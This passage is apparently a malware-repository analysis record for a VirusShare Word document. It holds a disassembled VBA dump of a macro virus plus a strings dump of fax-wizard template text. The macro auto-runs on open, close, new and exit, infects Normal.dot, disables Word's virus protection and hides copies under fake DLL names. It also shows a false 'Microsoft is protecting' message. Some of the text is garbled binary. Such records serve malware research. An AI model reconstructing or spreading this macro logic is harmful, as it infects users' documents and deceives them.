\tQuoteRem 0x0008 0x000C \" ReportError\"\n' Line #1600:\n' Macros/VBA/NewMacros - 9471 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Sub infect(m))\n' Line #2:\n' \tLd wdAlertsNone \n' \tLd Application \n' \tMemSt DisplayAlerts \n' Line #3:\n' \tLd Assistant \n' \tMemLd Animation \n' \tSt d \n' Line #4:\n' \tLd msoAnimationGetTechy \n' \tLd Assistant \n' \tMemSt Animation \n' Line #5:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall getnormal 0x0001 \n' Line #6:\n' \tLd d \n' \tLd Assistant \n' \tMemSt Animation \n' Line #7:\n' \tEndSub \n' Line #8:\n' Line #9:\n' \tFuncDefn (Sub deletenormal(m))\n' Line #10:\n' \tOnError e \n' Line #11:\n' \tLineCont 0x000C 05 00 08 00 0B 00 08 00 13 00 08 00\n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLitStr 0x0009 \"NewMacros\"\n' \tParamNamed New \n' \tLitStr 0x000C \"oldNewMacros\"\n' \tParamNamed NewName \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerRename 0x0004 \n' Line #12:\n' \tLabel e \n' Line #13:\n' \tEndSub \n' Line #14:\n' \tFuncDefn (Sub copymacro(m))\n' Line #15:\n' \tOnError eco \n' Line #16:\n' \tLineCont 0x000C 05 00 08 00 0B 00 08 00 11 00 08 00\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0009 \"NewMacros\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #17:\n' \tLabel eco \n' Line #18:\n' \tEndSub \n' Line #19:\n' Line #20:\n' \tFuncDefn (Sub replicate(m))\n' Line #21:\n' \tLitDI2 0x0032 \n' \tLd Rnd \n' \tMul \n' \tParen \n' \tLitDI2 0x0001 \n' \tAdd \n' \tFnInt \n' \tLitDI2 0x0019 \n' \tEq \n' \tIfBlock \n' Line #22:\n' \tSetStmt \n' \tLd Assistant \n' \tMemLd NewBalloon \n' \tSet a \n' Line #23:\n' \tLitStr 0x0007 \"Help me\"\n' \tLd a \n' \tMemSt Heading \n' Line #24:\n' \tLitStr 0x0027 \"I'm not feeling very vell .. AAARGHH!!!\"\n' \tLd a \n' \tMemSt Then \n' Line #25:\n' \tLd a \n' \tArgsMemCall Show 0x0000 \n' Line #26:\n' \tEndIfBlock \n' Line #27:\n' \tOnError re \n' Line #28:\n' \tStartWithExpr \n' \tLd ActiveDocument \n' \tWith \n' Line #29:\n' \tLitStr 0x000A \"Normal.dot\"\n' \tMemStWith AttachedTemplate \n' Line #30:\n' \tEndWith \n' Line #31:\n' \tLineCont 0x000C 05 00 08 00 0B 00 08 00 13 00 08 00\n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0009 \"NewMacros\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #32:\n' \tLabel re \n' Line #33:\n' \tEndSub \n' Line #34:\n' \tFuncDefn (Sub AutoNew())\n' Line #35:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall infect 0x0001 \n' Line #36:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall replicate 0x0001 \n' Line #37:\n' \tLitStr 0x0007 \"AutoNew\"\n' \tParen \n' \tArgsCall runmacro 0x0001 \n' Line #38:\n' \tEndSub \n' Line #39:\n' \tFuncDefn (Sub AutoClose())\n' Line #40:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall infect 0x0001 \n' Line #41:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall replicate 0x0001 \n' Line #42:\n' \tLitStr 0x0009 \"AutoClose\"\n' \tParen \n' \tArgsCall runmacro 0x0001 \n' Line #43:\n' \tEndSub \n' Line #44:\n' \tFuncDefn (Sub autoopen())\n' Line #45:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall infect 0x0001 \n' Line #46:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall replicate 0x0001 \n' Line #47:\n' \tLitStr 0x0008 \"autoopen\"\n' \tParen \n' \tArgsCall runmacro 0x0001 \n' Line #48:\n' \tEndSub \n' Line #49:\n' \tFuncDefn (Sub AutoExit())\n' Line #50:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall infect 0x0001 \n' Line #51:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall replicate 0x0001 \n' Line #52:\n' \tLitStr 0x0008 \"AutoExit\"\n' \tParen \n' \tArgsCall runmacro 0x0001 \n' Line #53:\n' \tEndSub \n' Line #54:\n' \tFuncDefn (Sub ToolsMacro())\n' Line #55:\n' \tLd Documents \n' \tMemLd Count \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #56:\n' \tLitStr 0x0067 \"Microsoft is protecting your normal.dot from virus infection You can only add macros to other documents\"\n' \tLd vbOKOnly \n' \tArgsLd MsgBox 0x0002 \n' \tSt n \n' Line #57:\n' \tExitSub \n' Line #58:\n' \tElseBlock \n' Line #59:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall getnormal 0x0001 \n' Line #60:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall restoreoriginal 0x0001 \n' Line #61:\n' \tLd wdDialogToolsMacro \n' \tArgsLd Dialogs 0x0001 \n' \tArgsMemCall Show 0x0000 \n' Line #62:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall recopy 0x0001 \n' Line #63:\n' \tEndIfBlock \n' Line #64:\n' \tEndSub \n' Line #65:\n' Line #66:\n' \tFuncDefn (Sub restoreoriginal(m))\n' Line #67:\n' \tOnError rr1 \n' \tBoS 0x0000 \n' Line #68:\n' \tLineCont 0x0008 05 00 08 00 0B 00 08 00\n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLitStr 0x0009 \"NewMacros\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerDelete 0x0003 \n' Line #69:\n' \tLabel rr1 \n' Line #70:\n' \tOnError rro \n' \tBoS 0x0000 \n' Line #71:\n' \tLineCont 0x000C 05 00 08 00 0B 00 08 00 13 00 08 00\n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLitStr 0x000C \"oldNewMacros\"\n' \tParamNamed New \n' \tLitStr 0x0009 \"NewMacros\"\n' \tParamNamed NewName \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerRename 0x0004 \n' Line #72:\n' \tLabel rro \n' Line #73:\n' \tEndSub \n' Line #74:\n' \tFuncDefn (Sub recopy(m))\n' Line #75:\n' \tOnError eco \n' Line #76:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall reren 0x0001 \n' Line #77:\n' \tLineCont 0x000C 05 00 08 00 14 00 08 00 1A 00 08 00\n' \tLd wdProgramPath \n' \tLd Options \n' \tArgsMemLd DefaultFilePath 0x0001 \n' \tLd Application \n' \tMemLd PathSeparator \n' \tAdd \n' \tLitStr 0x000A \"wininf.dll\"\n' \tAdd \n' \tParamNamed Source \n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0009 \"NewMacros\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #78:\n' \tLabel eco \n' Line #79:\n' \tEndSub \n' Line #80:\n' \tFuncDefn (Sub reren(m))\n' Line #81:\n' \tOnError rre \n' Line #82:\n' \tLineCont 0x000C 05 00 08 00 0B 00 08 00 13 00 08 00\n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Source \n' \tLitStr 0x0009 \"NewMacros\"\n' \tParamNamed New \n' \tLitStr 0x000C \"oldNewMacros\"\n' \tParamNamed NewName \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerRename 0x0004 \n' Line #83:\n' \tLabel rre \n' Line #84:\n' \tEndSub \n' Line #85:\n' \tFuncDefn (Sub getnormal(m))\n' Line #86:\n' \tLitStr 0x000A \"prncfg.ini\"\n' \tLitStr 0x000C \"Printer Port\"\n' \tLitStr 0x000A \"PortNumber\"\n' \tLd System \n' \tArgsMemLd PrivateProfileString 0x0003 \n' \tSt virusflag \n' Line #87:\n' \tLitVarSpecial (False)\n' \tLd Options \n' \tMemSt VirusProtection \n' Line #88:\n' \tLd virusflag \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIfBlock \n' Line #89:\n' \tLitStr 0x0003 \"340\"\n' \tLitStr 0x000A \"prncfg.ini\"\n' \tLitStr 0x000C \"Printer Port\"\n' \tLitStr 0x000A \"PortNumber\"\n' \tLd System \n' \tArgsMemSt PrivateProfileString 0x0003 \n' Line #90:\n' \tLd NormalTemplate \n' \tArgsMemCall OpenAsDocument 0x0000 \n' \tQuoteRem 0x0042 0x001D \"save normal.dot to windot.dll\"\n' Line #91:\n' \tLd wdProgramPath \n' \tLd Options \n' \tArgsMemLd DefaultFilePath 0x0001 \n' \tLd Application \n' \tMemLd PathSeparator \n' \tAdd \n' \tLitStr 0x000A \"windot.dll\"\n' \tAdd \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' Line #92:\n' \tLd ActiveDocument \n' \tArgsMemCall Close 0x0000 \n' Line #93:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall deletenormal 0x0001 \n' Line #94:\n' \tLitDI2 0x0001 \n' \tParen \n' \tArgsCall copymacro 0x0001 \n' Line #95:\n' \tLd NormalTemplate \n' \tArgsMemCall OpenAsDocument 0x0000 \n' Line #96:\n' \tLd wdProgramPath \n' \tLd Options \n' \tArgsMemLd DefaultFilePath 0x0001 \n' \tLd Application \n' \tMemLd PathSeparator \n' \tAdd \n' \tLitStr 0x000A \"wininf.dll\"\n' \tAdd \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' \tQuoteRem 0x0075 0x0011 \"save infected dot\"\n' Line #97:\n' \tLd ActiveDocument \n' \tArgsMemCall Close 0x0000 \n' Line #98:\n' \tEndIfBlock \n' Line #99:\n' \tEndSub \n' Line #100:\n' \tFuncDefn (Sub runmacro(m))\n' Line #101:\n' \tOnError rme \n' Line #102:\n' \tLitStr 0x0014 \"Normal.oldNewMacros.\"\n' \tLd m \n' \tAdd \n' \tLd Application \n' \tArgsMemCall Run 0x0001 \n' Line #103:\n' \tLabel rme \n' Line #104:\n' \tEndSub \n' Line #105:\n' \tFuncDefn (Sub stealth())\n' Line #106:\n' \tArgsCall ToolsMacro 0x0000 \n' Line #107:\n' \tLitStr 0x0007 \"stealth\"\n' \tArgsCall MsgBox 0x0001 \n' Line #108:\n' \tEnd \n' Line #109:\n' \tEndSub \n' Line #110:\n' Line #111:\n' Line #112:\n\n\ufffdP\ufffdN.\n\ufffdS\ufffdmg\n\u0351\ufffde\t\ufffdeQ.\nP\ufffd{\ufffdO\n_AQ1\ufffd\ufffd`\ufffdP\ufffdN\ufffdS\u0351\ufffde\t\ufffdeQ\ufffd\ufffdR!hck\n0\ufffdP\ufffdN\n0\tc\n\\\ufffd\ufffdR!hck\n\ufffd\ufffdvX[0R \n\ufffdv\ufffde\ufffde\ufffdN-N\n0x\ufffd\ufffdS\n0\u0351\ufffde\t\ufffdeQ\n0\n\ufffd\ufffdN\ufffdO\ufffd_ \n\ufffdP\ufffdN\ufffde\ufffdN-N\t\ufffdeQ\ufffd\ufffdR!hck"
    },
    "filename": "VirusShare_15528b76f1928bec8f6de20f56ad4249",
    "filesize": 336896,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: Ted, Template: Normal.dot, Last Saved By: Ted, Revision Number: 3, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Fri Feb 13 10:23:00 1998, Last Saved Time/Date: Fri May  7 05:33:00 1999, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "15528b76f1928bec8f6de20f56ad4249",
        "sha1": "067e373478ffb8ad7bb5b1b44bfb496781ac528b",
        "sha256": "7a56f83c4d532efcb7bac4ce8708f5655d9c6988cd9fbb3c37a940ff45939b12"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "/ =!",
            "l\"!;5",
            "Normal.dot",
            "Microsoft Word 8.0",
            "Z[i8",
            "Trend Micro.",
            "Title",
            "_PID_GUID",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "RegEnumKeyA",
            "RegOpenKeyA",
            "RegCloseKey",
            "GetWindowsDirectoryA",
            "FindWindowA",
            "WinHelpA",
            "CrAA\\\ufdb5C ",
            "LktwIB\\\u073c\u01a9Mq\u0178r[J",
            "\u043fn[J\u046ar ",
            " Insert Field",
            "eq \\o",
            " Ruby string align ",
            "Zi}H",
            "(\\s\\up ",
            "),C@v",
            " Kludge, To remove space char at end of field....",
            "Zi} ",
            " Get Selected Field Values",
            " { eq \\o\\ad(\\s\\up 12(foo),bar) }",
            " { eq \\o\\ad(\\s\\up 12(foo),bar) }",
            "                     ~~~",
            " { eq \\o\\ad(\\s\\up 12(foo),bar) }",
            "                  ~~",
            " { eq \\o\\ad(\\s\\up 12(foo),bar) }",
            "        ~~~",
            " { eq \\o\\ad(\\s\\up 12(foo),bar) }",
            "   ~~~~~   ~~~~~~ and \"),\\s\\do\" is only contained Kumimoji field",
            " eq \\o",
            "(\\s\\up~",
            "),\\s\\do",
            "Windows",
            "Windows NTH",
            "WinNT",
            "Macintosh",
            "http://www.microsoft.com/isapi/redir.dll?",
            "PRD=Word",
            "&SBP=ia",
            "&PLCID=",
            "&PVER= ",
            "&OS= ",
            "&OVER= ",
            "&OLCID=",
            "intentionally left blank",
            "&CLCID=",
            "HKEY_CURRENT_USER\\Control Panel\\International",
            "Locale ",
            "&AR=templates",
            "&O1=",
            "&O2=",
            "&O3=",
            "look at all hyperlinks in doc",
            "http://www.microsoft.com/isapi/redir.dll?PRD=Word&SBP=ia&PVER=8.0&AR=templates",
            "look for address to change",
            "get Anchor - Text Or Shape",
            "text anchor",
            "shape anchorh",
            "delete old link",
            "add new hlink in same place",
            "Standard Claimer",
            "'******************************************************************************",
            "TO BE LOCALIZED",
            "'******************************************************************************",
            "Style names",
            "Public Const strSTY_RETURN_ADDR     As String = \"Return Address\"",
            "Public Const strSTY_DOC_LABEL       As String = \"Document Label\"",
            "Public Const strSTY_COMPANY_NAME    As String = \"Company Name\"",
            "Public Const strSTY_MSG_HDR_FIRST   As String = \"Message Header First\"",
            "Public Const strSTY_MSG_HDR_LABEL   As String = \"Message Header Label\"",
            "Public Const strSTY_MSG_HDR_LAST    As String = \"Message Header Last\"",
            "misc strings",
            "Public Const strPHONE   As String = \"q\u0721G\"",
            "Public Const strFAX     As String = \"\u01efuq\u0721G\"",
            "Public Const strPAGES   As String = \"`\u01a1G\"",
            "Public Const strTO      As String = \"\u0321G\"",
            "Public Const strFROM    As String = \"H\u0321G\"",
            "Public Const strDATE    As String = \"G\"",
            "Public Const strRE      As String = \"DG\"",
            "Public Const strCC      As String = \"G\"",
            "Public Const strCOMPANY         As String = \"q\u6e39G\"",
            "Public Const strFAX_NUMBER      As String = \"\u01efuq\u0721G\"",
            "Public Const strPHONE_NUMBER    As String = \"q\u0721G\"",
            "Public Const strTOTAL_NO_PAGES  As String = \"]t\u02adb`@\u01a1G\"",
            "Public Const strEMPTY_MACRO As String = \"EmptyMacro \"",
            "Public Const strNONE        As String = \"<None>\" 'choice to list of merge field",
            "names found in data source",
            "doc. if there is no field for last name.",
            "if the user selected this choice we don't",
            "insert a merge field for last name in the cover sheet.",
            "Public Const strFLD_NAME As String = \"Name\" 'to select the field containing recipient name",
            "from the fields present in the data source",
            "Public Const strFLD_FAX As String = \"Fax\" 'to select the merge field containing fax number",
            "Public Const strCLICK_HERE_NAME     As String = \"[@Uo\u033fJmW]\"",
            "Public Const strCLICK_HERE_PAGES    As String = \"[@Uo\u033fJ\u01efu]\"",
            "Public Const strCLICK_HERE_SUBJECT  As String = \"[@Uo\u033fJ\u01efuD]\"",
            "Public Const strCLICK_HERE_COMMENTS As String = \"[@Uo\u033fJnO]\"",
            "Public Const strCLICK_HERE_COMPANY  As String = \"[@Uo\u033fJqW]\"",
            "Public Const strCLICK_HERE_PHONE_NUMBER As String = \"[@Uo\u033fJq]\"",
            "Public Const strCLICK_HERE_FAX_NUMBER As String = \"[@Uo\u033fJ\u01efuq]\"",
            "Address format to get info. from the Address book. Please be careful about the commas and",
            "spaces since you might end up with a space at the beginning of a name if not put at the right place.",
            "Please change the names only if you know the correct one.",
            "Public Const strADDR_BK_NAME_FORMAT As String = \"{{<PR_GIVEN_NAME> }{<PR_SURNAME>}|<PR_DISPLAY_NAME>}\"",
            "Public Const strADDR_BK_ADDR_FORMAT As String = \"{<PR_POSTAL_ADDRESS>|{<PR_STREET_ADDRESS>\" & vbCr & \"}{<PR_LOCALITY>}{, {<PR_STATE_OR_PROVINCE> }<PR_POSTAL_CODE>}}\"",
            "Public Const strADDR_BK_FAXNUM_FORMAT As String = \"{<PR_PRIMARY_FAX_NUMBER>|<PR_BUSINESS_FAX_NUMBER>|<PR_HOME_FAX_NUMBER>}\"",
            "Public Const strADDR_BK_PHONE_FORMAT As String = \"{<PR_PRIMARY_TELEPHONE_NUMBER>|<PR_BUSINESS_TELEPHONE_NUMBER>|<PR_OFFICE_TELEPHONE_NUMBER>}\"",
            "Public Const strADDR_BK_COMPANY_FORMAT As String = \"{<PR_COMPANY_NAME>}\"",
            "status messages put up while faxing the cover sheet and document. For some messages",
            "I add \"...\" and so add \"...\" to all strings.",
            "Public Const strFAXING_DOC_RECIPIENTS As String = \"b\u01efuo\udb97\ude69\u04a6...\"",
            "Public Const strFAXING_DOC_RECIPIENT As String = \"b\u01efuo\udb97\ude66\"",
            "Public Const strFAXING_CS_RECIPIENTS As String = \"b\u01efu\u02ad\u04a6...\"",
            "Public Const strFAXING_CS_RECIPIENT As String = \"b\u01efu\u02ad\u04a6\"",
            "Public Const strFAXING_CS_TO As String = \"b\u01efu\u02ad\"",
            "Public Const strFAXING_DOC_TO As String = \"b\u01efu\"",
            "the text in the last panel",
            "the first one is the default. The next string is used if the user selects no cover sheet, when",
            "we actually send the fax on clicking Finish",
            "Public Const strLAST_PANEL_DFLT_TEXT As String = \"pGFD\u0721A\u042ds\u01efuFA\u02ecdJ\u01efuq\u072a\u69a1O_TC\u04a6pAzOO\u0464FQqq\u0728t\u03a6b~ueA\u0765Ap\u01a6ru9vCnOo[i\u01efuq\u0724I\"",
            "Public Const strLAST_PANEL_NOCOVSHT_TEXT As String = \"\u04a6\u01a4wJA@UAFNeXz\u01efuI\"",
            "strings necessary to display help in case of failure of Fax",
            "Public Const strHLP_FAX_INSTALL As String = \"pGz{b\u6abaO Windows 95A{bzNiHw\u02e5FFCUTwA",
            "WN|X{UAiDzpw\u02faFI\"",
            "the next string is the title as it appears on Word's main window",
            "Public Const strMS_WORD As String = \"Microsoft Word\"",
            "make sure that strCMD_BAR_TITLE is as long as strCMD_BTN_TEXT, so that strCMD_BTN_TITLE does not get clipped off",
            "when the command bar is displayed.",
            "Public Const strCMD_BAR_TITLE   As String = \"\u01efuF\"",
            "Public Const strCMD_BTN_TEXT    As String = \"{beX\u01efu\"",
            "Public Const strCURRENT_DOC     As String = \"\u062be(\"",
            "Public Const strRIGHT_PAREN     As String = \")\"",
            "Window caption of the cover sheet (the document's name will follow if the user is faxing a document)",
            "Public Const strWINDOW_CAPTION  As String = \"\u01efu\u02ad\"",
            "Window caption if user is not faxing a doc. and just created a cover sheet.",
            "Public Const strCOVER_SHEET_CAPTION As String = \" - \u01efu\u02ad\"",
            "Text in merge fields inserted in the cover sheet",
            "Public Const strFLD_FAX_NAME    As String = \"Name\"",
            "Public Const strFLD_FAX_NUMBER  As String = \"FaxNumber\"",
            "In NT3.51, the printer name from the print set up dialog which is called when the user clicks on",
            "Other... , returns the printer name with the printer location after ON",
            "so if a printer name is \\\\abcd\\efg with location \"location1\" then the printer",
            "name is returned a \"\\\\abcd\\efg ON location1. So we have to strip out the text",
            "after ON. That's what this constant is for. In other countries too is this text",
            "going to be ON?",
            "Public Const strPRINTER_ON      As String = \" ON \"",
            "Public Const iMAX_ADDR_LINES = 3 'max. # of lines address can have",
            "Error messages",
            "Public Const strERR_MAX_ADDR_LINES  As String = \"a}iWLTC\"",
            "Public Const strERR_NO_DATA_SRC     As String = \"F\u4923n\u01efuC\"",
            "Public Const strERR_CREATING_CMDBAR As String = \"FLk\u0625\u07e1uSend FaxvuCC \u042ds\u01efuFC\"",
            "Public Const strERR_NO_MAIN_DOC1     As String = \"n\u0625\u07eb\u02ad\u6aba (\"",
            "Public Const strERR_NO_MAIN_DOC2     As String = \") }\u04a1C\u0425}\u04b8\u04e4AM\u1b6bsFI\"",
            "Public Const strERR_DISPLAY_QUERY_OPTIONS As String = \"F\u4923n[J\u01a1C\"",
            "Public Const strERR_CHOOSING_DOC As String = \"FLkn\u03a8\u04f6\u01efuC\"",
            "Public Const strERR_RCPNTS_NOT_CHOSEN As String = \"F\u076dnDo\u032cO\u05a1C\u042bUuTwvsAM\u01efu\u0321C\"",
            "this tip is displayed in an Autodown balloon finally",
            "Public Const strPOST_WIZARD_TIP_NO_MRG_FLD As String = \"\u043fJ\u4966zQgb\u02adW\u01a1AMUb \" & strCMD_BAR_TITLE & \" uyCWu\" & strCMD_BTN_TEXT & \"vsC \"",
            "this tip is displayed if we inserted merge fields in the cover sheet i.e. in the case of multiple recipients",
            "Public Const strPOST_WIZARD_TIP_MRG_FLD As String = \"\u043fJ\u4966zQgb\u02adW\u01a1AMUb \" & strCMD_BAR_TITLE & \" uyCWu\" & strCMD_BTN_TEXT & \"vsC \" & \"\u0424nRbu<< >>v\u0178Fy\u01efuFNQ\u03a5L\u0328\u04f6\u01efuzw\uc9ac\u0324WC\"",
            "this message is put up after we successfully faxed everything",
            "Public Const strMSG_FAX_SUCCESS As String = \"FwNzeXhFC\"",
            "the 72 factor in the below 2 measurements is conversion factor of inches to points",
            "contemporary styles have a left indent of 0.56\"",
            "Public Const sCONT_LEFT_INDENT As Single = 0.56 * 72",
            "While converting text to table, for the Contemporary style alone,",
            "I need to set the first column's width explicitly. For English text,",
            "0.5\" is big enough. If the text in the first column is getting truncated",
            "in your language, then please increase this value.",
            "Public Const sCONT_WIDTH_COL1 As Single = 2.36 * 72",
            "The date format need not be localized if VB does not require it.",
            "Medium date is of the format \"02-Apr-94\". If the standard date format",
            "is anything different in the country, then please change it.",
            "important to have MMMM and not mmmm, since mm refers to minutes in a time field",
            "Public Const strDATE_FORMAT As String = \"MMMM d, yyyy\"",
            "'******************************************************************************",
            "DO NOT LOCALIZE THE CONSTANTS/DECLARATIONS BEYOND THIS",
            "'******************************************************************************",
            "the following are the names of the autotext entries in the wizard.",
            "DON'T CHANGE THE NAMES OF THE AUTOTEXT ENTRIES IN THE WIZARD.",
            "if you change them, then please change the following strings too, correspondingly",
            "Public Const strAT_UNCHKD_BOX   As String = \"Unchecked Box\"",
            "Public Const strAT_CHKD_BOX     As String = \"Checked Box\"",
            "Public Const strCNTMPGFX2        As String = \"cntmpgfx2\"",
            "Public Const strPOST_WIZ_BLN    As String = \"Fax Post Wizard Balloon\"",
            "Public Const sA4_LEFT_MARGIN    As Single = 82.08",
            "Public Const sA4_RIGHT_MARGIN    As Single = 81.36",
            "Public Const sLETTER_MARGIN     As Single = 90",
            "key where setup writes company name",
            "Public Const strREGKEY_CMPNY_NAME As String = \"HKEY_CURRENT_USER\\Software\\Microsoft\\MS Setup (ACME)\\User Info\"",
            "Public Const strVALKEY_CMPNY_NAME As String = \"DefCompany\"",
            "set if user changes the doc. to be faxed",
            "main doc which has to be sent",
            " main doc's data src",
            "SQL query used to select all names from the data source",
            "Public Const strSELECT_QUERY As String = \"Select * From \"",
            "form and callback balloon constants",
            "Public Const iMAX_PANEL As Integer = 6 'panel # of the last panel in",
            "the dialog (starts from 0)Z ",
            " as many as there are statesZ D",
            "available styles",
            "Public Const iSTY_PROFESSIONAL  As Integer = 0",
            "Public Const iSTY_CONTEMPORARY  As Integer = 1",
            "Public Const iSTY_ELEGANT       As Integer = 2",
            "array for holding long and short template names",
            "Public Const iLONG_NAME As Integer = 0",
            "Public Const iSHORT_NAME As Integer = 1",
            "stores the fax style chosen",
            "disabled in NT",
            "Panel numbers",
            "Public Const iPANEL_RCPNTS As Integer = 3",
            "Public Const iPANEL_SENDER As Integer = 5",
            "Public Const iPANEL_STYLE  As Integer = 4",
            "Max. number of recipients",
            "Public Const iMAX_RCPNTS As Integer = 5",
            "true if doc. is a form letter",
            "to store the data options query that the user selects for the form letter",
            "Z Dh",
            "true if there is an main doc. apart",
            "from the doc created by FileNew",
            "keeps track of which panel to be skipped.",
            "if we are enabling a panel, then we need to restore the shape's",
            "color to as it was before. rgiColorShape stores that colorZ ",
            "if rgfSkipPanel(i) is True,",
            "then skip the ith panel",
            "False if user selects \"No cover sheet\"",
            "Z D ",
            "Fax program selected by the user",
            "Public Const iMS_FAX    As Integer = 0  'Microsoft Fax",
            "Public Const iDIFF_FAX  As Integer = 1  'Other than MS Fax",
            "Public Const iNO_FAX    As Integer = 2  'just print without faxing the doc/cover sheet",
            "true if MRU list has been read from reg.",
            "text beside the check boxes",
            "assistant help for form letter recipients' panel",
            "assistant help for ordinary doc. recipients' panel",
            "tip displayed in an autodown balloon after the wizard is done",
            "tip is to be displayed only if cmd bar created",
            "arrays to get the MRU list of recipient names and numbers stored in the registry",
            "arrays to get the recipients names and numbers that the user entered",
            "DO NOT LOCALIZE - CONTROL NAMES",
            "Public Const strCBO_RCPNT_NAME  As String = \"cboRcpntName\"",
            "Public Const strCBO_RCPNT_NUM   As String = \"cboRcpntNum\"",
            "DO NOT LOCALIZE - REGISTRY ENTRIES",
            "Public Const strRCPNT_NAME      As String = \"Name of recipient#\"",
            "Public Const strRCPNT_NUMBER    As String = \"Number of recipient#\"",
            "Public Const strNUM_RCPNTS      As String = \"Number of recipients\"",
            "Help files",
            "Public Const strWIN_HELP_FILE As String = \"Windows.hlp\"",
            "Public Const strFAX_HELP_FILE As String = \"awfax.hlp\"",
            "contexts for the help",
            "Public Const lCNTXT_FAX_INSTALL As Long = 461903903",
            "Public Const lCNTXT_FAX_SEND As Long = 1698757633",
            "Public Const HELP_COMMAND As Integer = 258 'hex value = 0x0102",
            "error number that word returns on fax not being installed",
            "Public Const iERR_FAX_NOT_INSTALLED As Integer = 5663",
            "Public Const iERR_FAX_NOT_SENT As Integer = 4559",
            "DO NOT LOCALIZE - REGISTRY ENTRIES REGARDING PRINTERS",
            "Const KEY_ALL_ACCESS As Long = &HF0063",
            "registry keys under which printer names are found",
            "System\\CurrentControlSet\\Control\\Print\\Providers\\",
            "System\\CurrentControlSet\\Control\\Print\\Printers\\",
            "initialise the vars. whiehc refer to the wizard's name",
            "\u01efuF'",
            "\u01efuF'",
            "CFax1",
            "initialize strings specific to this wizard",
            "fax title for the different styles",
            "\u01efuH ",
            "\u01efuH ",
            "text appearing after the unchecked boxes",
            "Assistant messages",
            "\u03e5\u03b6\u01efuFAziH\u01efuqllANHX\u05a8\u01efu\udb52\udd24@_\u01efuA \u03b1q\u01efuLX@i\u02adC",
            "pGzQn\u01efu\u4966A\u0425}\u04b1zQn\u01efuAMA\u01efuFC",
            "pGz@~t\u03acO Windows NTAhzLk\u03e5 Microsoft \u01efuAOz\u066cOiH\u03e5\u03a8\u4966ww\u02e6bt\u03a4\u01efun\u04ecz\u01efuCpGzt\u03a4\u4d29\u01efu\\\u0aba\u0721ASYAziHNCLX\u04e1AMAQ\u03b6\u01efuN\u01efuXhC",
            "pGz\u03b9L\u01efuFAhU\u0526M|CXz\u032a\u01efuLW\u0661C ziHbM\u6924\u01efuLANbz\u02ad\u6927@_\u01efuXhC",
            "\u043fJzQgb\u02adWe\u032a\u01a1C ",
            "\u043fz\u02ad\u04adn\u69a1Cb\u01efueAz\u066cOiH\u072b\u02ad\u6aba~[A\u03acO[JnOC ",
            "n\u05e7]wA\u042buW@BvC ",
            "if user is faxing a form letter, we have a different set of controls in the Recipients panel. So, we change the help text too.",
            "IumWvAA\u04fdIu\u01efuq\u0721vA MqqTn[JH\u03a8\u01efuq\u0721C ziH\u0736\u01efuC@\u04e4H\u03acOwu\u01efuYHC'",
            "pGz\u03b9L\u01efuFAumWv\ucabaU\u0526M|\u032a\u01efuHWrCziHq\u0329mWJ\u02ad\u6924C'",
            "M~\u01efu.dot ",
            "cPrfax.dot ",
            "{N\u01efu.dot ",
            "cCofax.dot ",
            "\u5dae\u01efu.dot ",
            "cElfax.dot ",
            "'**********************************************************************",
            "DO NOT LOCALIZE BEYOND THIS POINT.",
            "'******************************************************************************",
            "initialize arrays with the color of the subway shapes for the panels",
